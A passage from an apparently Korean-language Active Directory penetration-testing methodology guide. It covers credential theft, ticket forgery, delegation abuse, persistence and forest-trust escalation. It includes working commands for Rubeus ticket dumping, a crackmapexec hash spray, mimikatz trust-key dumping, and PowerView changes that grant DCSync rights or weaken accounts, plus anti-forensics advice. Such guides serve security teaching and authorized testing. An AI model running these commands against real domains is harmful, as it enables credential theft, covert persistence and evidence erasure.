# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

그런 다음 복구한 gMSA를 다른 자격 증명과 마찬가지로 평가합니다. 로컬/도메인 그룹 멤버십, 로그온 권한, SPN, 위임 및 접근 가능한 서비스를 확인한 후 pass-the-hash를 시도합니다. 이 ACL 기반 획득 경로는 KDS root key가 손상된 후 관리형 암호를 도출하는 [Golden gMSA/dMSA](golden-dmsa-gmsa.md)와는 다릅니다.<sup>[[20]](#references)</sup>

컴퓨터 보안 주체가 다른 컴퓨터 객체나 그룹을 제어할 수 있는 아웃바운드 권한을 보유한 경우도 있습니다. 이를 획득한 후에는 중첩 멤버십과 유효 ACL을 별도로 확인합니다. 다른 컴퓨터 객체에 대한 쓰기 권한은 계정 변경을 가능하게 할 수 있고, 그룹 멤버십 권한은 로그온 역할로 이어질 수 있습니다. 스테이징 계정 플래그, 예측 가능한 이름 지정 규칙 또는 `GenericWrite` 엣지만으로는 전체 경로가 성립한다고 볼 수 없습니다.

파일, 공유 또는 백업에서 읽을 수 있는 `msDS-ManagedPassword` blob 사본을 발견하는 것은 별도의 노출 경로입니다. LDAP 읽기 ACL은 다른 위치에 저장된 사본을 보호할 수 없습니다. 해석하기 전에 데이터가 관리형 암호 blob인지 확인하고, 이를 승인된 LDAP 읽기 및 KDS root key 도출과 구분합니다.

### Kerberoast

Kerberoasting은 사용자 계정에 연결된 서비스에서 사용하는 **TGS 티켓**을 획득하고, 사용자 암호를 기반으로 한 암호화를 **오프라인**에서 크래킹하는 기법입니다.

자세한 내용은 다음을 참고하세요:


{{#ref}}
kerberoast.md
{{#endref}}

### 원격 연결 (RDP, SSH, FTP, Win-RM 등)

자격 증명을 획득했다면 접근할 수 있는 **컴퓨터**가 있는지 확인할 수 있습니다. 이를 위해 포트 스캔 결과에 따라 **CrackMapExec**을 사용해 여러 프로토콜로 여러 서버에 연결을 시도할 수 있습니다.

### Local Privilege Escalation

도메인 일반 사용자의 자격 증명이나 세션을 손상시켰고 도메인 내 **어떤 컴퓨터든** 접근할 수 있다면, **로컬에서 권한을 상승시키고 자격 증명을 수집할** 경로를 찾습니다. 로컬 관리자 권한이 있으면 메모리(LSASS)와 로컬 저장소(SAM)에서 **다른 사용자의 해시를 덤프할** 수 있습니다.

이 책에는 [**Windows 로컬 권한 상승**](../windows-local-privilege-escalation/index.html)에 관한 전체 페이지와 [**체크리스트**](../checklist-windows-privilege-escalation.md)가 있습니다. [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)도 사용하는 것을 잊지 마세요.

### 현재 세션 티켓

현재 사용자의 **티켓**이 예상치 못한 리소스에 **접근할 권한을 제공하는** 경우는 매우 **드물지만**, 다음 명령으로 확인할 수 있습니다:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

도메인 자격 증명이나 사용자 세션을 확보했다면 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 다시 살펴보세요. 인증된 열거 및 coercion 기법을 사용하면 인증되지 않은 정찰 단계에서는 확인할 수 없었던 relay 경로를 찾을 수 있습니다.

### 컴퓨터 공유에서 자격 증명 찾기 | SMB 공유

기본적인 자격 증명을 확보했다면 **AD 내부에서 공유 중인 흥미로운 파일을 찾을 수 있는지** 확인해야 합니다. 수동으로 할 수도 있지만, 매우 지루하고 반복적인 작업입니다(확인해야 할 문서가 수백 개라면 더더욱 그렇습니다).

[**사용할 수 있는 도구를 알아보려면 이 링크를 따라가세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds 탈취

다른 **PC나 공유에 액세스**할 수 있다면, SCF 파일 같은 파일을 **배치**할 수 있습니다. 누군가 해당 파일에 액세스하면 당신을 상대로 NTLM 인증을 **유발해** **NTLM challenge**를 **탈취**하고 이를 크랙할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점으로 인증된 사용자라면 누구나 **도메인 컨트롤러를 침해할 수 있었습니다**.


{{#ref}}
printnightmare.md
{{#endref}}

## 권한이 있는 자격 증명/세션을 이용한 Active Directory 권한 상승

**다음 기법에는 일반 도메인 사용자 권한만으로는 충분하지 않습니다. 이러한 공격을 수행하려면 특별한 권한이나 자격 증명이 필요합니다.**

### Hash 추출

[AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relaying을 포함한 [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [로컬 권한 상승](../windows-local-privilege-escalation/index.html) 등을 통해 **일부 로컬 관리자 계정을 침해**했기를 바랍니다.\
이제 메모리와 로컬에 있는 모든 해시를 덤프할 차례입니다.\
[**해시를 얻는 여러 방법은 이 페이지를 참고하세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**사용자의 해시를 확보했다면**, 이를 사용해 해당 사용자로 **가장할 수 있습니다**.\
해당 **해시를 사용해 NTLM 인증을 수행하는** **도구**를 사용하거나, 새 **sessionlogon**을 만들고 그 **해시를** **LSASS에 주입**할 수 있습니다. 그러면 NTLM 인증이 수행될 때마다 해당 **해시가 사용됩니다.** 후자의 방법은 mimikatz가 사용하는 방식입니다.\
[**자세한 내용은 이 페이지를 참고하세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 NTLM 프로토콜의 Pass The Hash를 대체하는 방법으로, **사용자의 NTLM hash를 사용해 Kerberos 티켓을 요청**합니다. 따라서 NTLM 프로토콜이 비활성화되고 인증 프로토콜로 **Kerberos만 허용되는 네트워크에서** 특히 **유용할 수 있습니다**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 공격 방식에서 공격자는 사용자의 비밀번호나 hash 값 대신 **사용자의 인증 티켓을 탈취**합니다. 그런 다음 이 티켓을 사용해 **사용자로 가장하여** 네트워크 내 리소스와 서비스에 무단으로 액세스합니다.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 자격 증명 재사용

로컬 **관리자**의 **hash**나 **비밀번호**가 있다면 이를 사용해 다른 **PC에 로컬로 로그인**해 보세요.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> 유의하세요. 이는 상당히 **시끄럽고(noisy)**, **LAPS**가 이를 **완화**할 수 있습니다.

### MSSQL Abuse & Trusted Links

사용자에게 **MSSQL 인스턴스에 액세스**할 권한이 있다면, MSSQL 호스트에서 **명령을 실행**하거나(SA로 실행 중인 경우), NetNTLM **hash**를 **탈취**하거나 **relay attack**을 수행할 수도 있습니다.\
MSSQL 인스턴스가 다른 인스턴스의 database link를 통해 신뢰되는 경우, 연결된 database에 대한 권한이 있는 사용자는 **신뢰 관계를 이용해 다른 인스턴스에서 쿼리를 실행**할 수 있습니다. 이러한 신뢰 관계는 연쇄적으로 연결될 수 있으며, 결국 사용자가 명령을 실행할 수 있는 잘못 구성된 database에 도달할 수도 있습니다.\
**Database 간 링크는 forest trust를 넘어 작동합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 자산/배포 플랫폼 악용

타사 인벤토리 및 배포 제품군은 자격 증명과 코드 실행으로 이어지는 강력한 경로를 노출하는 경우가 많습니다. 자세한 내용은 다음을 참조하세요.

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

컴퓨터에 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 속성이 설정된 Computer 객체를 찾았고 해당 컴퓨터에 대한 domain 권한이 있다면, 컴퓨터에 로그인하는 모든 사용자의 메모리에서 TGT를 덤프할 수 있습니다.\
따라서 **Domain Admin이 컴퓨터에 로그인하면**, 해당 사용자의 TGT를 덤프하고 [Pass the Ticket](pass-the-ticket.md)을 사용해 사칭할 수 있습니다.\
Constrained Delegation을 이용하면 **Print Server를 자동으로 침해**할 수도 있습니다(바라건대 DC일 것입니다).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자 또는 컴퓨터가 "Constrained Delegation"을 사용하도록 허용된 경우, **컴퓨터의 특정 서비스에 액세스하기 위해 모든 사용자를 사칭**할 수 있습니다.\
따라서 해당 사용자/컴퓨터의 **hash를 침해**하면 (domain admin을 포함한) **모든 사용자를 사칭**해 특정 서비스에 액세스할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대한 **WRITE** 권한이 있으면 **상승된 권한**으로 코드를 실행할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 권한/ACL 악용

침해한 사용자에게 일부 domain 객체에 대한 **흥미로운 권한**이 있다면, 이를 이용해 측면으로 **이동**하거나 권한을 **상승**시킬 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 서비스 악용

domain 내에서 **수신 대기 중인 Spool 서비스**를 발견하면 이를 **악용**해 **새 자격 증명을 획득**하고 **권한을 상승**시킬 수 있습니다.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 타사 세션 악용

**다른 사용자**가 **침해된** 컴퓨터에 **액세스**한다면, **메모리에서 자격 증명을 수집**하고 해당 사용자를 사칭하기 위해 프로세스에 beacon을 **주입**할 수도 있습니다.\
사용자는 보통 RDP를 통해 시스템에 액세스하므로, 타사 RDP 세션을 대상으로 몇 가지 attack을 수행하는 방법은 다음과 같습니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 domain에 가입된 컴퓨터의 **local Administrator password**를 관리하는 시스템으로, 암호를 **무작위화**하고 고유하게 유지하며 자주 **변경**하도록 합니다. 이 암호는 Active Directory에 저장되며, ACL을 통해 승인된 사용자만 액세스할 수 있습니다. 이 암호에 액세스할 충분한 권한이 있으면 다른 컴퓨터로 이동할 수 있습니다.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

침해한 컴퓨터에서 **인증서를 수집**하면 환경 내에서 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**취약한 템플릿**이 구성되어 있다면 이를 악용해 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 높은 권한 계정으로 사후 침투

### Domain 자격 증명 덤프

**Domain Admin**, 또는 더 높은 **Enterprise Admin** 권한을 획득하면 **domain database**인 _ntds.dit_를 **덤프**할 수 있습니다.

[**DCSync attack에 대한 자세한 내용은 여기에서 확인할 수 있습니다**](dcsync.md).

[**NTDS.dit를 탈취하는 방법에 대한 자세한 내용은 여기에서 확인할 수 있습니다**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit`와 `SYSTEM` hive를 함께 포함하는, 읽을 수 있는 백업 아카이브는 압축을 풀기 전이라도 노출된 directory 자료로 간주해야 합니다. 오래된 password hash라고 해서 다른 객체 속성까지 안전한 것은 아닙니다. `description` 같은 필드에 자격 증명이나 운영 관련 메모가 들어 있을 수 있습니다. 먼저 아카이브의 멤버 이름을 확인하고, 추출한 database 내용이 일상적인 열거 출력에 포함되지 않도록 하세요.

### Persistence로서의 Privesc

앞에서 설명한 기법 중 일부는 persistence에 사용할 수 있습니다.\
예를 들어 다음과 같이 할 수 있습니다.

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하게 만들기

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하도록 설정합니다

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- 사용자에게 [**DCSync**](#dcsync) 권한 부여

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack**은 **NTLM hash**(예: **PC 계정의 hash**)를 사용해 특정 서비스에 대한 **정상적인 Ticket Granting Service (TGS) ticket**을 생성합니다. 이 방법은 **서비스 권한에 접근**하는 데 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**은 Active Directory (AD) 환경에서 공격자가 **krbtgt 계정의 NTLM hash**에 접근하는 공격입니다. 이 계정은 AD 네트워크 내 인증에 필수적인 모든 **Ticket Granting Ticket (TGT)**에 서명하는 데 사용되므로 특별합니다.

공격자는 이 hash를 획득하면 원하는 계정의 **TGT**를 만들 수 있습니다(Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이는 **일반적인 golden ticket 탐지 메커니즘을 우회하는 방식으로 위조된 golden ticket**과 같습니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **인증서를 이용한 계정 지속성**

**계정의 인증서를 보유하거나 인증서를 요청할 수 있으면** 사용자의 계정에 지속적으로 접근할 수 있는 매우 좋은 방법입니다(사용자가 암호를 변경하더라도):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **인증서를 이용한 도메인 지속성**

**인증서를 사용하면 도메인 내에서 높은 권한으로 지속성을 유지할 수도 있습니다:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder 그룹

Active Directory의 **AdminSDHolder** 객체는 **Domain Admins** 및 **Enterprise Admins**와 같은 **권한 있는 그룹**에 표준 **Access Control List (ACL)**을 적용하여 무단 변경을 방지합니다. 하지만 이 기능은 악용될 수 있습니다. 공격자가 AdminSDHolder의 ACL을 수정해 일반 사용자에게 전체 권한을 부여하면, 해당 사용자는 모든 권한 있는 그룹을 광범위하게 제어할 수 있습니다. 따라서 보호를 위한 이 보안 조치가 면밀히 모니터링되지 않으면 오히려 의도치 않은 접근을 허용할 수 있습니다.

[**AdminDSHolder 그룹에 대한 자세한 정보는 여기에서 확인하세요.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM 자격 증명

모든 **Domain Controller (DC)**에는 **로컬 관리자** 계정이 있습니다. 해당 컴퓨터에서 관리자 권한을 획득하면 **mimikatz**를 사용해 로컬 Administrator hash를 추출할 수 있습니다. 그다음 레지스트리를 수정해 **이 암호를 사용할 수 있도록 설정**하면 로컬 Administrator 계정에 원격으로 접근할 수 있습니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL 지속성

**사용자**에게 특정 도메인 객체에 대한 **특수 권한**을 **부여**하면, 해당 사용자가 **나중에 권한을 상승**시킬 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### 보안 설명자

**보안 설명자**는 객체가 다른 객체에 대해 가지는 **권한**을 **저장**하는 데 사용됩니다. 객체의 **보안 설명자**를 **조금만 변경**할 수 있다면, 권한 있는 그룹의 구성원이 아니더라도 해당 객체에 대해 매우 흥미로운 권한을 얻을 수 있습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects를 이용한 안티포렌식 / 회피

`dynamicObject` 보조 클래스를 악용해 `entryTTL`/`msDS-Entry-Time-To-Die`가 적용된 수명이 짧은 principal/GPO/DNS 레코드를 생성합니다. 이 객체는 tombstone을 남기지 않고 자동 삭제되어 LDAP 증거를 지우지만, 고아 SID, 끊어진 `gPLink` 참조 또는 캐시된 DNS 응답은 남깁니다(예: AdminSDHolder ACE 오염, 악성 `gPCFileSysPath` 또는 AD 통합 DNS 리디렉션).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

메모리의 **LSASS**를 변경해 **범용 암호**를 설정하고 모든 도메인 계정에 접근할 수 있도록 합니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
컴퓨터에 접근하는 데 사용되는 **자격 증명**을 **평문으로 캡처**하도록 **자체 SSP**를 만들 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD에 **새 Domain Controller**를 등록하고 이를 사용해 지정된 객체의 속성(SIDHistory, SPN 등)을 **변경 로그를 남기지 않고** **푸시**합니다. **DA** 권한이 있어야 하며 **root domain** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 상당히 눈에 띄는 로그가 남을 수 있습니다.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS 지속성

앞서 **LAPS 암호를 읽을 수 있는 충분한 권한**이 있을 때 권한을 상승시키는 방법을 살펴봤습니다. 하지만 이 암호는 **지속성을 유지하는 데에도** 사용할 수 있습니다.\
확인하세요:


{{#ref}}
laps.md
{{#endref}}

## Forest 권한 상승 - Domain Trusts

Microsoft는 **Forest**를 보안 경계로 간주합니다. 즉, **단일 도메인을 침해하면 Forest 전체가 침해될 가능성이 있습니다**.<sup>[[1]](#references)</sup>

### 기본 정보

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **도메인**의 사용자가 다른 **도메인**의 리소스에 접근할 수 있도록 하는 보안 메커니즘입니다. 이는 두 도메인의 인증 시스템을 연결하여 인증 검증이 원활하게 이루어지도록 합니다. 도메인 간 trust를 설정하면 두 도메인은 trust의 무결성에 필수적인 특정 **키**를 서로 교환하고 각자의 **Domain Controller (DC)**에 보관합니다.

일반적인 경우, 사용자가 **trusted domain**의 서비스에 접근하려면 먼저 자신의 도메인 DC에 **inter-realm TGT**라는 특수 ticket을 요청해야 합니다. 이 TGT는 두 도메인이 합의한 공유 **키**로 암호화됩니다. 그런 다음 사용자는 이 TGT를 **trusted domain의 DC**에 제시해 서비스 ticket(**TGS**)을 받습니다. trusted domain의 DC가 inter-realm TGT를 성공적으로 검증하면 TGS를 발급하고, 이를 통해 사용자는 해당 서비스에 접근할 수 있습니다.

**단계**:

1. **Domain 1**의 **client computer**가 자신의 **NTLM hash**를 사용해 **Domain Controller (DC1)**에 **Ticket Granting Ticket (TGT)**을 요청하며 절차를 시작합니다.
2. 클라이언트 인증에 성공하면 DC1은 새 TGT를 발급합니다.
3. 그런 다음 클라이언트는 **Domain 2**의 리소스에 접근하는 데 필요한 **inter-realm TGT**를 DC1에 요청합니다.
4. inter-realm TGT는 양방향 domain trust의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)**에 전달합니다.
6. DC2는 공유 trust key를 사용해 inter-realm TGT를 검증하고, 유효하면 클라이언트가 접근하려는 Domain 2의 서버에 대한 **Ticket Granting Service (TGS)**를 발급합니다.
7. 마지막으로 클라이언트는 서버 계정 hash로 암호화된 이 TGS를 서버에 제시해 Domain 2의 서비스에 접근합니다.

### 다양한 trust 유형

**trust는 단방향 또는 양방향일 수 있다는 점에 유의해야 합니다.** 양방향인 경우 두 도메인이 서로를 신뢰합니다. 반면 **단방향** trust 관계에서는 한 도메인이 **trusted** 도메인이고 다른 도메인이 **trusting** 도메인입니다. 후자의 경우 **trusted 도메인에서 trusting 도메인 내부의 리소스에만 접근할 수 있습니다**.

Domain A가 Domain B를 신뢰한다면 A는 trusting 도메인이고 B는 trusted 도메인입니다. 또한 **Domain A**에서는 **Outbound trust**이고 **Domain B**에서는 **Inbound trust**입니다.

**다양한 trust 관계**

- **Parent-Child Trusts**: 같은 forest 내에서 흔히 구성되는 방식으로, child domain은 parent domain과 자동으로 양방향 전이적 trust를 맺습니다. 즉, 인증 요청이 parent와 child 간에 원활하게 전달될 수 있습니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며, referral 절차를 단축하기 위해 child domain 간에 설정됩니다. 복잡한 forest에서는 인증 referral이 일반적으로 forest root까지 올라간 다음 대상 도메인으로 내려와야 합니다. cross-link를 만들면 이 경로가 짧아지며, 지리적으로 분산된 환경에서 특히 유용합니다.
- **External Trusts**: 서로 관련이 없는 도메인 간에 설정되며 기본적으로 비전이적입니다. [Microsoft 문서](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에 따르면 external trust는 forest trust로 연결되지 않은 현재 forest 외부 도메인의 리소스에 접근할 때 유용합니다. external trust에서는 SID filtering을 통해 보안을 강화합니다.
- **Tree-root Trusts**: forest root domain과 새로 추가된 tree root 간에 자동으로 설정됩니다. 흔히 접하지는 않지만, forest에 새 도메인 트리를 추가해 고유한 도메인 이름을 유지하고 양방향 전이성을 보장하는 데 중요합니다. 자세한 내용은 [Microsoft 안내서](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)를 참조하세요.
- **Forest Trusts**: 두 forest root domain 간에 설정되는 양방향 전이적 trust 유형으로, 보안 강화를 위해 SID filtering도 적용합니다.
- **MIT Trusts**: Windows가 아닌 [RFC4120 준수](https://tools.ietf.org/html/rfc4120) Kerberos 도메인과 설정됩니다. MIT trust는 다소 특수한 유형으로, Windows 생태계 외부의 Kerberos 기반 시스템과 통합해야 하는 환경에 사용됩니다.

#### **trust 관계**의 기타 차이점

- trust 관계는 **전이적**일 수도 있습니다(A가 B를 신뢰하고, B가 C를 신뢰하면 A도 C를 신뢰함). 또는 **비전이적**일 수 있습니다.
- trust 관계는 **양방향 trust**(서로 신뢰) 또는 **단방향 trust**(한쪽만 다른 쪽을 신뢰)로 설정할 수 있습니다.

### 공격 경로

1. trusting 관계를 **열거**합니다.
2. **보안 주체**(사용자/그룹/컴퓨터)가 **다른 도메인**의 리소스에 **접근**할 수 있는지 확인합니다. ACE 항목에 포함되어 있거나 다른 도메인의 그룹에 속해 있을 수 있습니다. **도메인 간 관계**를 살펴보세요(trust는 아마도 이를 위해 생성되었을 것입니다).
   1. 이 경우 kerberoast도 다른 방법이 될 수 있습니다.
3. 도메인 간 이동에 사용할 수 있는 **계정**을 **침해**합니다.

다른 도메인의 리소스에 접근할 수 있는 공격자의 주요 경로는 다음 세 가지입니다.

- **Local Group Membership**: 보안 주체가 서버의 "Administrators" 그룹과 같은 컴퓨터의 로컬 그룹에 추가되어 해당 컴퓨터를 상당히 강력하게 제어할 수 있습니다.
- **Foreign Domain Group Membership**: 보안 주체가 외부 도메인의 그룹에 속할 수도 있습니다. 하지만 이 방법의 효과는 trust의 특성과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: 보안 주체가 **ACL**에 지정될 수 있으며, 특히 **DACL** 내 **ACE**의 구성 요소로 지정되어 특정 리소스에 접근할 수 있습니다. ACL, DACL, ACE의 작동 방식에 대해 더 알아보려면 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 백서가 매우 유용합니다.<sup>[[17]](#references)</sup>

### 권한이 있는 외부 사용자/그룹 찾기

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**를 확인하면 도메인의 외부 보안 주체를 찾을 수 있습니다. 이는 **외부 도메인/forest**의 사용자/그룹입니다.

**Bloodhound**에서 확인하거나 powerview를 사용할 수 있습니다:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent 포리스트 권한 상승

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

도메인 트러스트를 열거하는 다른 방법:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **신뢰 키가 2개** 있습니다. 하나는 _Child --> Parent_용이고, 다른 하나는 _Parent_ --> _Child_용입니다.\
> 현재 도메인에서 사용 중인 키는 다음을 사용해 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection을 악용해 Enterprise admin으로 권한을 상승시키고 child/parent domain으로 이동합니다:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 쓰기 가능한 Configuration NC 악용

Active Directory(AD) 환경에서 Configuration Naming Context(NC)를 어떻게 악용할 수 있는지 이해하는 것은 중요합니다. Configuration NC는 포리스트 전반의 구성 데이터가 저장되는 중앙 저장소입니다. 이 데이터는 포리스트 내 모든 Domain Controller(DC)에 복제되며, 쓰기 가능한 DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 DC, 가급적이면 child DC에서 **SYSTEM 권한**이 있어야 합니다.

**GPO를 루트 DC 사이트에 연결**

Configuration NC의 Sites 컨테이너에는 AD 포리스트의 모든 도메인 가입 컴퓨터 사이트에 대한 정보가 포함되어 있습니다. 어느 DC에서든 SYSTEM 권한으로 작업하면 공격자는 GPO를 루트 DC 사이트에 연결할 수 있습니다. 이렇게 사이트에 적용되는 정책을 조작하면 루트 도메인이 침해될 수 있습니다.

자세한 내용은 [SID Filtering 우회](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)에 관한 연구를 참고하세요.<sup>[[12]](#references)</sup>

**포리스트 내 임의의 gMSA 침해**

공격 벡터 중 하나는 도메인 내의 권한 있는 gMSA를 표적으로 삼는 것입니다. gMSA의 암호를 계산하는 데 필요한 KDS Root key는 Configuration NC에 저장됩니다. 어느 DC에서든 SYSTEM 권한이 있으면 KDS Root key에 접근해 포리스트 내 모든 gMSA의 암호를 계산할 수 있습니다.

자세한 분석과 단계별 안내는 다음을 참고하세요:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

상호 보완적인 위임 MSA 공격(BadSuccessor – 마이그레이션 속성 악용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema 변경 공격**

이 방법은 새 권한 AD 객체가 생성될 때까지 기다려야 하므로 인내심이 필요합니다. SYSTEM 권한이 있으면 공격자는 AD Schema를 수정해 모든 클래스에 대한 완전한 제어 권한을 임의의 사용자에게 부여할 수 있습니다. 이로 인해 새로 생성되는 AD 객체에 대한 무단 접근 및 제어가 가능해질 수 있습니다.

자세한 내용은 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)를 참고하세요.<sup>[[14]](#references)</sup>

**ADCS ESC5를 이용해 DA에서 EA로 권한 상승**

ADCS ESC5 취약점은 Public Key Infrastructure(PKI) 객체에 대한 제어 권한을 악용해 포리스트 내 임의의 사용자로 인증할 수 있는 인증서 템플릿을 만드는 공격입니다. PKI 객체는 Configuration NC에 있으므로 쓰기 가능한 child DC를 침해하면 ESC5 공격을 수행할 수 있습니다.

자세한 내용은 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)를 참고하세요.<sup>[[15]](#references)</sup> ADCS가 없는 환경에서도 공격자는 필요한 구성 요소를 설정할 수 있습니다. 이에 대한 내용은 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)에서 확인할 수 있습니다.<sup>[[16]](#references)</sup>

### 외부 포리스트 도메인 - 단방향(인바운드) 또는 양방향

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

이 시나리오에서는 **외부 도메인이 여러분의 도메인을 신뢰**하며, 여러분은 해당 도메인에 대해 **정해지지 않은 권한**을 가집니다. 여러분의 도메인에 속한 **어떤 주체가 외부 도메인에 어떤 액세스 권한을 갖는지** 찾아낸 다음 이를 악용해야 합니다:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포리스트 도메인 - 단방향(아웃바운드)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

